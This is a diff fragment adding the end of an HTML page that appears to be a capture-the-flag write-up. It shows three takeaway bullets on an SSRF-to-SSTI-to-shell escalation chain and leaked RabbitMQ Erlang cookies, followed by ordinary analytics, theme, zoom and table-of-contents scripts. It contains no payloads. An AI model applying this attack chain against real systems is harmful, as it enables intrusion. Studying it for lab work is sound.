+<li><strong>SSRF unlocks “internal-only”</strong>: docs + admin APIs are often reachable once you can hit localhost/ports.</li>
+<li><strong>SSTI is a fast escalation chain</strong>: reflection → evaluation → RCE → shell.</li>
+<li><strong>Erlang cookie is critical</strong>: once leaked, RabbitMQ internals (and sometimes system-level escalation) become reachable.</li>
+</ul>
+</div>
+<div class="footer">
+<a class="btn" href="#goals">⬆ Back to top</a>
+</div>
+</div><aside class="wh-aside"><div class="wh-aside-card"><div class="wh-aside-title">On this page</div><nav id="whToc"></nav></div></aside></div>
+<!-- Image Zoom Modal -->
+<div id="imageModal">
+<div class="close-modal">×</div>
+<img alt="Zoomed image" id="modalImage" src=""/>
+</div>
+<script type="text/javascript">
+var sc_project=13192699;
+var sc_invisible=1;
+var sc_security="f34343e1";
+var scJsHost = "https://";
+document.write("<sc"+"ript type='text/javascript' src='" +
+scJsHost+
+"statcounter.com/counter/counter.js'></"+"script>");
+</script>
+<noscript>
+<div class="statcounter">
+<img alt="statcounter" class="statcounter" src="https://c.statcounter.com/13192699/0/f34343e1/1/"/>
+</div>
+</noscript>
+<script>
+    // Theme toggle
+    document.getElementById('themeToggle')?.addEventListener('click', () => {
+      document.documentElement.classList.toggle('light');
+      localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
+    });
+
+    // Image zoom modal
+    const modal = document.getElementById('imageModal');
+    const modalImg = document.getElementById('modalImage');
+    const closeModalBtn = document.querySelector('#imageModal .close-modal');
+
+    document.querySelectorAll('figure img').forEach(img => {
+      img.onclick = function(e) {
+        e.stopPropagation();
+        modalImg.src = this.getAttribute('src');
+        modal.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      };
+    });
+
+    const close = () => {
+      modal.classList.remove('active');
+      document.body.style.overflow = '';
+    };
+
+    closeModalBtn.onclick = close;
+    modal.onclick = (e) => { if (e.target === modal) close(); };
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && modal.classList.contains('active')) close();
+    });
+  </script>
+<script id="wh-unified-script">
+(function(){
+  // Progress bar
+  const bar = document.querySelector('#whProgress > div');
+  const updateProgress = () => {
+    if(!bar) return;
+    const doc = document.documentElement;
+    const scrollTop = doc.scrollTop || document.body.scrollTop;
+    const height = (doc.scrollHeight - doc.clientHeight) || 1;
+    const pct = Math.min(100, Math.max(0, (scrollTop / height) * 100));
+    bar.style.width = pct.toFixed(2) + '%';
+  };
+  window.addEventListener('scroll', updateProgress, {passive:true});
+  updateProgress();
+
+  // Ensure we only have ONE working theme toggle (remove older listeners by cloning)
+  const original = document.getElementById('themeToggle');
+  if (original) {
+    const clone = original.cloneNode(true);
+    original.parentNode.replaceChild(clone, original);
+    clone.addEventListener('click', () => {
+      document.documentElement.classList.toggle('light');
+      localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
+    });
+  }
+
+  // Auto-topbar chips (only for pages that opted-in)
+  const topbar = document.querySelector('.topbar.wh-auto-topbar');
+  if(topbar){
+    const makeSlug = (s) => (s || '').toLowerCase()
+      .replace(/^[0-9]+\s*[\)|\.]\s*/,'')
+      .replace(/[^a-z0-9\s-]/g,'')
+      .trim().replace(/\s+/g,'-').slice(0,60) || ('section-' + Math.random().toString(16).slice(2));
+
+    const pickEmoji = (t) => {
+      const s = (t||'').toLowerCase();
+      if(s.includes('goal')) return '🎯';
+      if(s.includes('host')) return '🧩';
+      if(s.includes('recon') || s.includes('nmap') || s.includes('scan')) return '🛰️';
+      if(s.includes('enum') || s.includes('fuzz') || s.includes('dir')) return '🧪';
+      if(s.includes('login') || s.includes('auth')) return '🔐';
+      if(s.includes('api')) return '🧭';
+      if(s.includes('ssrf')) return '🕳️';
+      if(s.includes('ssti')) return '🧨';
+      if(s.includes('ftp')) return '📦';
+      if(s.includes('pcap') || s.includes('wireshark')) return '🦈';
+      if(s.includes('ssh')) return '🗝️';
+      if(s.includes('priv') || s.includes('privesc')) return '⚡';
+      if(s.includes('flag')) return '🏁';
+      if(s.includes('exploit') || s.includes('rce')) return '💥';
+      if(s.includes('sql')) return '🧬';
+      if(s.includes('xss')) return '🧷';
+      return '📌';
+    };
+
+    const container = document.querySelector('.container');
+    const anchors = [];
+
+    const goals = container?.querySelector('.toc#goals');
+    if(goals) anchors.push({el: goals, label: 'Goals'});
+
+    (container ? Array.from(container.querySelectorAll('h2')) : []).forEach(h => {
+      anchors.push({el: h, label: h.textContent || 'Section'});
+    });
+
+    // Create chips after the theme toggle button
+    const themeBtn = topbar.querySelector('#themeToggle');
+    anchors.forEach(({el, label}) => {
+      if(!el.id) el.id = makeSlug(label);
+      const clean = (label||'').replace(/^[0-9]+\s*[\)|\.]\s*/,'').trim();
+      const a = document.createElement('a');
+      a.className = 'btn';
+      a.href = '#' + el.id;
+      a.textContent = pickEmoji(clean) + ' ' + (clean.length>24 ? clean.slice(0,24)+'…' : clean);
+      // insert after theme button (keep toggle first)
+      if(themeBtn && themeBtn.nextSibling) topbar.insertBefore(a, themeBtn.nextSibling);
+      else topbar.appendChild(a);
+    });
+  }
+
+  // Right-side TOC (all writeups)
+  const toc = document.getElementById('whToc');
+  const container = document.querySelector('.container');
+  if(toc && container){
+    const makeSlug = (s) => (s || '').toLowerCase()
+      .replace(/^[0-9]+\s*[\)|\.]\s*/,'')
+      .replace(/[^a-z0-9\s-]/g,'')
+      .trim().replace(/\s+/g,'-').slice(0,60) || ('section-' + Math.random().toString(16).slice(2));
+
+    const sections = [];
+    const goals = container.querySelector('.toc#goals') || container.querySelector('.toc');
+    if(goals){
+      if(!goals.id) goals.id = 'goals';
+      sections.push({el: goals, title: 'Goals'});
+    }
+    container.querySelectorAll('h2').forEach(h => {
+      if(!h.id) h.id = makeSlug(h.textContent);
+      const title = (h.textContent||'').replace(/^[0-9]+\s*[\)|\.]\s*/,'').trim();
+      sections.push({el: h, title: title || 'Section'});
+    });
+
+    toc.innerHTML='';
+    sections.forEach((s) => {
+      const a = document.createElement('a');
+      a.href = '#' + s.el.id;
+      a.innerHTML = `<span class="wh-dot"></span><span>${s.title.length>32 ? s.title.slice(0,32)+'…' : s.title}</span>`;
+      toc.appendChild(a);
+    });
+
+    const links = Array.from(toc.querySelectorAll('a'));
+    const setActive = (id) => {
+      links.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#'+id));
+    };
+
+    const obs = new IntersectionObserver((entries) => {
+      const visible = entries
+        .filter(e => e.isIntersecting)
+        .sort((a,b) => b.intersectionRatio - a.intersectionRatio)[0];
+      if(visible) setActive(visible.target.id);
+    }, { root: null, threshold: [0.2,0.35,0.55], rootMargin: '-20% 0px -70% 0px' });
+
+    sections.forEach(s => obs.observe(s.el));
+    setActive(sections[0]?.el?.id || '');
+  }
+})();
+</script></body>
+</html>
